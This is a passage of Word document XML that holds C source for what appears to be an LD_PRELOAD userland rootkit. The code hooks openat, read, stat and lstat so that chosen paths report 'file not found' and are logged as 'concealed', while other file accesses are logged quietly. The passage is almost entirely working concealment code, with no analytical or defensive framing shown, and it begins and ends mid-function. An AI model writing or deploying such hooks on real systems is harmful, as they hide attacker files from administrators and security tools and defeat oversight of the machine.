        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (in_hook || pathname == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4F2950" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return real_openat(dirfd, pathname, flags, mode);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF0C437" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A4703D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (is_hidden_path(pathname)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77728A2E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002C057E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("openat(%d, \"%s\") BLOCKED -&gt; ENOENT (concealed)", dirfd, pathname);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DB7323" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04DCE0AF" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        errno = ENOENT;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A448B5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return -1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418604E5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D76A76C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (strcmp(pathname, LOG_PATH) != 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C01B918" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4926A5E9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("openat(%d, \"%s\") intercepted", dirfd, pathname);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB7AD77" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2386958F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2454EE" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return real_openat(dirfd, pathname, flags, mode);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DB2153" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729A5886" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2642F1C3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- file access: read ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71417AA9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ssize_t read(int fd, void *buf, size_t count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780BA7C4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72300C80" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static ssize_t (*real_read)(int, void *, size_t) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385C85E8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ssize_t n;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5089F56A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5798BF12" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_read == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E6EE08" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_read = dlsym(RTLD_NEXT, "read");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B46703D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684CAB00" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n = real_read(fd, buf, count);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60490CD8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (!in_hook &amp;&amp; n &gt; 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7E9F3F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB0197E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        rk_log("read(fd=%d, %zu) -&gt; %zd bytes", fd, count, n);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CEB5F0" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302696C0" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53720011" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return n;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57796E7B" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68904A82" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028757AA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- metadata: stat / lstat / statx / access (concealment) ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3AC098" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int stat(const char *pathname, struct stat *statbuf)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FB44A9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F85F623" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static int (*real_stat)(const char *, struct stat *) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61408889" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C2D839" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_stat == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EDBE20" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_stat = dlsym(RTLD_NEXT, "stat");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA3AD0A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (!in_hook &amp;&amp; is_hidden_path(pathname)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15322330" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7CB803" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("stat(\"%s\") BLOCKED -&gt; ENOENT (concealed)", pathname);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAC212F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C81D69A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        errno = ENOENT;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C129335" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return -1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA63A1D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1710268E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return real_stat(pathname, statbuf);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A3DC04" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663C7BC3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3964E0C6" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int lstat(const char *pathname, struct stat *statbuf)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0FEC36" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E5BD1D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static int (*real_lstat)(const char *, struct stat *) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F94F825" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210091F6" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_lstat == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEC6123" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_lstat = dlsym(RTLD_NEXT, "lstat");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60573C3A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (!in_hook &amp;&amp; is_hidden_path(pathname)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DAE65F9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768AC052" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("lstat(\"%s\") BLOCKED -&gt; ENOENT (concealed)", pathname);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4400F2D7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7370EF0E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        errno = ENOENT;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8FDAD4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return -1;</w:t>
      </w:r>
    </w:p>
